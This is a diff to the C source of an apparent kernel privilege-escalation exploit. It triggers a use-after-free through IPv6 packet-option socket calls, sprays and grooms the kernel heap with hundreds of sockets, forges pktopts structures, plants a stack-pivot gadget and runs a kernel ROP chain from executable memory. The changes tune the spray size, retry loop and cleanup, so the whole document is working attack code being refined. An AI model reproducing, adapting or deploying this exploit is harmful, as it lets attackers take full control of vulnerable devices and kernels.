@@ -22,7 +22,8 @@
 #define TCLASS_MASTER_2 0x73310000
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
-#define SPRAY_SIZE 96
+#define SPRAY_SIZE 48
+
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
 #define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
@@ -39,7 +40,7 @@ int name(int s) { \
     socklen_t l = sizeof(v); \
     if (getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
         *(volatile int*)0; \
-        return v; \
+    return v; \
 }
 
 GET_TCLASS(get_tclass)
@@ -183,7 +184,7 @@ void sidt(unsigned long long* addr, unsigned short* size) {
         (unsigned long long)(ropchain + 13),
         __builtin_gadget_addr("mov [rsi], rax"),
         __builtin_gadget_addr("pop rsi"),
-        ~7ull,
+        ~7ul,
         __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
         __builtin_gadget_addr("mov rax, [rdi]"),
         __builtin_gadget_addr("pop rcx"),
@@ -249,9 +250,12 @@ int main() {
     int master_sock = new_socket();
     krop_master_sock = master_sock * 8;
 
-    int spray_sock[512];
-    for (int i = 0; i < 512; i++)
-        spray_sock[i] = new_socket();
+	int spray_sock[512];
+	for (int i = 0; i < 512; i++) {
+		spray_sock[i] = new_socket();
+		if (spray_sock[i] < 0)
+			*(volatile int*)0;
+	}
 
     struct opaque o = {
         .master_sock = master_sock,
@@ -259,58 +263,74 @@ int main() {
         .spray_sock = spray_sock
     };
 
-    pthread_t th1, th2;
-    // The userland ROP chain is only executed after trigger_uaf() and fake_pktopts() is validated
+// The enter_krop chain is only executed after trigger_uaf() and fake_pktopts() is validated
+for (int attempts = 0; attempts < 10; attempts++) {
     int overlap_idx = -1;
-    for (int attempts = 0; attempts < 10; attempts++) {
-        // Use valid threads with pthread_t
-        trigger_uaf(&o);
-        set_tclass(master_sock, TCLASS_TAINT);
-
-        overlap_idx = -1;
-        for (int i = 0; i < 512; i++)
-            if (get_tclass(spray_sock[i]) == TCLASS_TAINT)
-                overlap_idx = i;
-
-        if (overlap_idx < 0)
-            continue;
-
-        int overlap_sock = spray_sock[overlap_idx];
-        spray_sock[overlap_idx] = new_socket();
-
-        overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
-        if (overlap_idx < 0)
-            continue;
-
-        overlap_sock = spray_sock[overlap_idx];
-        spray_sock[overlap_idx] = new_socket();
-
-        char buf[20];
-        get_pktinfo(master_sock, buf);
-
-        char buf2[20];
-        for (int i = 0; i < 20; i++) buf2[i] = buf[i];
-
-        uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
-        krop_c3bak1 = *(uint64_t*)(buf2 + 4);
-        krop_c3bak2 = *(uint64_t*)(buf2 + 12);
-
-        *(uint16_t*)(buf2 + 4) = (uint16_t)entry_gadget;
-        *(uint64_t*)(buf2 + 10) = entry_gadget >> 16;
-        buf2[9] = 0xee;
-
-        krop_ud1 = *(uint64_t*)(buf2 + 4);
-        krop_ud2 = *(uint64_t*)(buf2 + 12);
-
-        set_pktinfo(master_sock, buf2);
-        enter_krop();
-
-        break; // Successful exploit run ROP Chain
+    for (int i = 0; i < SPRAY_SIZE; i++) {
+        close(spray_sock[i]);
+        spray_sock[i] = new_socket();
+        if (spray_sock[i] < 0)
+            *(volatile int*)0;
     }
+
+    trigger_uaf(&o);
+    set_tclass(master_sock, TCLASS_TAINT);
+
+    for (int i = 0; i < SPRAY_SIZE; i++) {
+        if (get_tclass(spray_sock[i]) == TCLASS_TAINT) {
+            overlap_idx = i;
+            break;
+        }
+    }
+
+    if (overlap_idx < 0)
+        continue;
+
+    int overlap_sock = spray_sock[overlap_idx];
+    spray_sock[overlap_idx] = new_socket();
+    if (spray_sock[overlap_idx] < 0)
+        *(volatile int*)0;
+
+    // Build fake pktopts
+    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
+    if (overlap_idx < 0)
+        continue;
+
+    overlap_sock = spray_sock[overlap_idx];
+    spray_sock[overlap_idx] = new_socket();
+    if (spray_sock[overlap_idx] < 0)
+        *(volatile int*)0;
+
+    // Modify pktinfo with pivot
+    char buf[32];
+    get_pktinfo(master_sock, buf);
+
+    uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
+
+    *(uint16_t*)(buf + 4) = (uint16_t)entry_gadget;
+    *(uint64_t*)(buf + 10) = entry_gadget >> 16;
+    buf[9] = 0xee;
+
+    krop_c3bak1 = *(uint64_t*)(buf + 4);
+    krop_c3bak2 = *(uint64_t*)(buf + 12);
+    krop_ud1 = *(uint64_t*)(buf + 4);
+    krop_ud2 = *(uint64_t*)(buf + 12);
+
+    set_pktinfo(master_sock, buf);
+
+    enter_krop();
+	nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL); // 100ms
+    break; // Successful exploit run ROP Chain
+	}
 
     // Map spray to ROP execution
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
+	
+	size_t spray_size = spray_stop - spray_start; // Check spray_size
+	if (spray_size == 0 || spray_size > 0x10000)
+    *(volatile int*)0;
+	
     char* spray_map = mmap(0, spray_stop - spray_start, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
     if (spray_map == MAP_FAILED)
         *(volatile int*)0; 
@@ -319,14 +339,15 @@ int main() {
         spray_map[i] = spray_start[i];
 
     // Run malloc sprays for pinned cores
-    for (int cpu = 1; cpu < 7; cpu++) {
+	pin_to_cpu(1);
+	rop_call_funcptr(spray_map, spray_sock, kernel_base); // Core 1 for spray_sock overlap
+    
+    for (int cpu = 2; cpu < 7; cpu++) {
         pin_to_cpu(cpu);
-        rop_call_funcptr(spray_map, spray_sock, kernel_base);
+        rop_call_funcptr(spray_map, NULL, kernel_base); // Remaining cores for malloc sprays (Heap Grooming)
     }
-    for (int cpu = 1; cpu < 7; cpu++) {
-        pin_to_cpu(cpu);
-        rop_call_funcptr(spray_map, NULL, kernel_base);
-    }
-        nanosleep("\0\0\0\0\0\0\0\0\x80\x17\xB4\x2C\0\0\0\0", NULL); // Ensure Mallocs Sprays are concluded before exiting
-    return 0;
+	for (int i = 0; i < 512; i++) // Clean sockets spray
+    close(spray_sock[i]);
+	nanosleep("\0\0\0\0\0\0\0\0\x00\x00\x20\xA1\07\0\0\0", NULL); // Safety exit
+	return 0;
 }
